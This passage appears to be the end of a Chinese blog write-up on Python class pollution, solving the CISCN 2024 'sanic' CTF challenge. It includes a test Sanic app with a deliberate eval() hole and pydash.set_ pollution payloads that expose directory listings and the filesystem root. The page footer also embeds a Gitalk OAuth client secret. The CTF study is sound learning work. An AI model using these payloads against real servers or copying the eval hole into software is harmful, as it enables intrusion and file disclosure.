+<p>自己搭建一个测试用环境，代码如下：</p>
+<pre><code class="language-python">from sanic import Sanic
+from sanic.response import text, html
+#from sanic_session import Session
+import sys
+import pydash
+# pydash==5.1.2
+
+
+class Pollute:
+    def __init__(self):
+        pass
+
+
+app = Sanic(__name__)
+app.static(&quot;/static/&quot;, &quot;./static/&quot;)
+#Session(app)
+
+
+#@app.route('/', methods=['GET', 'POST'])
+#async def index(request):
+    #return html(open('static/index.html').read())
+
+
+#@app.route(&quot;/login&quot;)
+#async def login(request):
+    #user = request.cookies.get(&quot;user&quot;)
+    #if user.lower() == 'adm;n':
+        #request.ctx.session['admin'] = True
+        #return text(&quot;login success&quot;)
+
+    #return text(&quot;login fail&quot;)
+
+
+@app.route(&quot;/src&quot;)
+async def src(request):
+    eval(request.args.get('cmd'))
+    return text(open(__file__).read())
+
+
+@app.route(&quot;/admin&quot;, methods=['GET', 'POST'])
+async def admin(request):
+    key = request.json['key']
+    value = request.json['value']
+    if key and value and type(key) is str and '_.' not in key:
+        pollute = Pollute()
+        pydash.set_(pollute, key, value)
+        return text(&quot;success&quot;)
+    else:
+        return text(&quot;forbidden&quot;)
+
+#print(app.router.name_index['name'].directory_view)
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0')
+
+</code></pre>
+<p>全局搜索 name_index</p>
+<p><img data-fancybox="gallery" src="https://img.24kblog.top/app/hide.php?key=bmdRL3l1dDhCQThaWnJTUmpVRU5iZE9uZUxJNGZoZGlzbEU9" alt="截图_选择区域_20250412053131.png" data-caption="截图_选择区域_20250412053131.png" loading="lazy"></p>
+<p>在上面的地方下断点就可以查看系统调用这个路由时的状态以及其具有的属性</p>
+<p><img data-fancybox="gallery" src="https://img.24kblog.top/app/hide.php?key=Vy8yVXozTmRJaW05cmovWG10QlgyZWFFbXFLWHkvSDdpdkE9" alt="截图_选择区域_20250412053558.png" data-caption="截图_选择区域_20250412053558.png" loading="lazy"></p>
+<p>根据以上信息可以构造处以下 payload：</p>
+<pre><code>&#123;&quot;key&quot;:&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;,&quot;value&quot;: true&#125;
+</code></pre>
+<p>接下来访问 /static/ ，发现已经可以看到目录下的文件了</p>
+<p><img data-fancybox="gallery" src="https://img.24kblog.top/app/hide.php?key=dkVMUm1WRzhDWUM4WDNydTFVd29JK2FFbXFLWHkvSDdpdkE9" alt="pre-wired-browser)_20250412054034.png" data-caption="pre-wired-browser)_20250412054034.png" loading="lazy"></p>
+<p>再试图污染 directory，它是一个对象，而其值是由 <code>parts</code> 属性决定的，而parts的值最后是给了<code>_parts</code> 这个属性，而这个 <code>_parts</code> 是一个了列表，可以直接污染<br />
+（注：此处其实是借鉴别的博客的，因为我在复现时完全找不到 <code>_parts</code> 属性）</p>
+<p>于是有以下 payload：</p>
+<pre><code>&#123;&quot;key&quot;:&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts&quot;,&quot;value&quot;: [&quot;/&quot;]&#125;
+</code></pre>
+<p>然后就可以查看文件名了</p>
+<p><img data-fancybox="gallery" src="https://img.24kblog.top/app/hide.php?key=eVJ1b3lLTmNIM2tEZkJZeGkwV1IvcHVERmFiWEs1OUtxM2dJ" alt="20240523112223-ac06f1f8-18b3-1.webp" data-caption="20240523112223-ac06f1f8-18b3-1.webp" loading="lazy"></p>
+<p>最后结合前面的任意文件读取即可获得 flag</p>
+<p><img data-fancybox="gallery" src="https://img.24kblog.top/app/hide.php?key=cEN5Y0R5L1dFWXZVRTJLM3FEMW0vT2FFbXFLWHkvSDdpdkE9" alt="pre-wired-browser)_20250412055631.png" data-caption="pre-wired-browser)_20250412055631.png" loading="lazy"></p>
+<hr />
+<p>参考：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Cl0ud/p/16213353.html">https://www.cnblogs.com/Cl0ud/p/16213353.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://tttang.com/archive/1876/">https://tttang.com/archive/1876/</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.7ntsec.cn/?p=56">https://www.7ntsec.cn/?p=56</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/gxngxngxn/p/18205235">https://www.cnblogs.com/gxngxngxn/p/18205235</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/14057">https://xz.aliyun.com/news/14057</a></li>
+</ul>
+
+  </article>
+
+  
+      
+    <div class="nexmoe-post-copyright">
+        <strong>本文作者：</strong>24kcsplus<br>
+        <strong>本文链接：</strong><a href="https://24kblog.top/posts/1724511731/" title="https:&#x2F;&#x2F;24kblog.top&#x2F;posts&#x2F;1724511731&#x2F;" target="_blank" rel="noopener">https:&#x2F;&#x2F;24kblog.top&#x2F;posts&#x2F;1724511731&#x2F;</a><br>
+        
+            <strong>版权声明：</strong>除非特别声明，否则本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
+        
+    </div>
+
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+    
+    
+        <a class="nexmoefont icon-tag-fill -none-link" href="/tags/CTF/" rel="tag">CTF</a> <a class="nexmoefont icon-tag-fill -none-link" href="/tags/Python/" rel="tag">Python</a> <a class="nexmoefont icon-tag-fill -none-link" href="/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" rel="tag">原型链污染</a> <a class="nexmoefont icon-tag-fill -none-link" href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag">笔记</a> <a class="nexmoefont icon-tag-fill -none-link" href="/tags/%E7%BD%91%E5%AE%89/" rel="tag">网安</a>
+    
+</div>
+
+  
+      <div class="nexmoe-post-footer">
+          <section class="nexmoe-comment">
+    <link rel="stylesheet" href="https://gcore.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.css">
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+<div id="gitalk"></div>
+<script src="https://gcore.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js"></script>
+<script type="text/javascript">
+    var gitalk = new Gitalk({
+        clientID: 'e33bbc7053e81da42425',
+        clientSecret: '947d44ea5a822012817f764e0a3d655a34995473',
+        id: md5(window.location.pathname),
+        repo: 'home_gitalk',
+        owner: '24kcsplus',
+        admin: '24kcsplus'
+    })
+    gitalk.render('gitalk')
+</script>
+</section>
+      </div>
+  
+</div>
+            <div class="nexmoe-post-right">
+              <div class="nexmoe-fixed">
+                  <div class="nexmoe-tool"> 
+                    
+                      
+                        
+                          
+                          
+                              <button class="mdui-fab catalog" style="overflow:unset;">
+                                  <i class="nexmoefont icon-i-catalog"></i>
+                                  <div class="nexmoe-toc">
+                                      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE%EF%BC%88%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">RCE（远程代码执行）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%EF%BC%88%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%EF%BC%89"><span class="toc-number">2.</span> <span class="toc-text">XSS（跨站脚本攻击）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE%EF%BC%88XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">XXE（XML外部实体注入）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF%EF%BC%88%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">CSRF（跨站请求伪造）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF%EF%BC%88%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%89"><span class="toc-number">5.</span> <span class="toc-text">SSRF（服务端请求伪造）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSTI%EF%BC%88%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-number">6.</span> <span class="toc-text">SSTI（模板注入）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">7.</span> <span class="toc-text">Python 原型链污染</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B%E8%AF%A6%E8%A7%A3"><span class="toc-number">7.1.</span> <span class="toc-text">执行过程详解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9D%E5%A7%8B%E7%8A%B6%E6%80%81"><span class="toc-number">7.1.1.</span> <span class="toc-text">初始状态</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%88%E5%B9%B6%E6%AD%A5%E9%AA%A4"><span class="toc-number">7.1.2.</span> <span class="toc-text">合并步骤</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-CISCN-2024-sanic"><span class="toc-number">7.2.</span> <span class="toc-text">例题 CISCN 2024 - sanic</span></a></li></ol></li></ol>
+                                  </div>
+                              </button>
+                          
+                          
+                      
+                    
+                      <a href="#nexmoe-content" class="toc-link" aria-label="回到顶部" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
+                  </div>
+              </div>
+            </div>
+        </div>
+    </div>
+     
+    <div id="nexmoe-search-space">
+        <div class="search-container">
+            <div class="search-header">
+                <div class="search-input-container">
+                    <input class="search-input" type="text" placeholder="搜索" oninput="sinput();">
+                </div>
+                <a class="search-close" onclick="sclose();">×</a>
+            </div>
+            <div class="search-body"></div>
+        </div>
+    </div>
+
+    
+<script src="/lib/mdui_043tiny/mdui.js"></script>
+<script src="/lib/jquery.min.js"></script>
+<script src="/lib/justifiedGallery/jquery.justifiedGallery.min.js"></script>
+<script src="/lib/fancybox/fancybox.umd.js"></script>
+
+
+ 
+
+<script async src="/js/app.js?v=1744437293682"></script>
+
+
+	<script async src="/js/search.js?v=1744437293682"></script>
+
+
+<script>
+	$(".justified-gallery").justifiedGallery({
+		rowHeight: 160,
+		margins: 10,
+	});
+</script>
+
+
+    
+
+
+
+
+
+    <!-- baidu Analytics -->
+<script>
+    var _hmt = _hmt || [];
+    (function() {var hm = document.createElement('script');
+    hm.src = 'https://hm.baidu.com/hm.js?3d735f78ee82156c8945803fe0b5d46c';
+    var s = document.getElementsByTagName('script')[0];
+        s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+    <script src="https://gcore.jsdelivr.net/gh/bobcn/hexo_resize_image.js@latest/hexo_resize_image.js"></script>
+</body>
+
+</html>
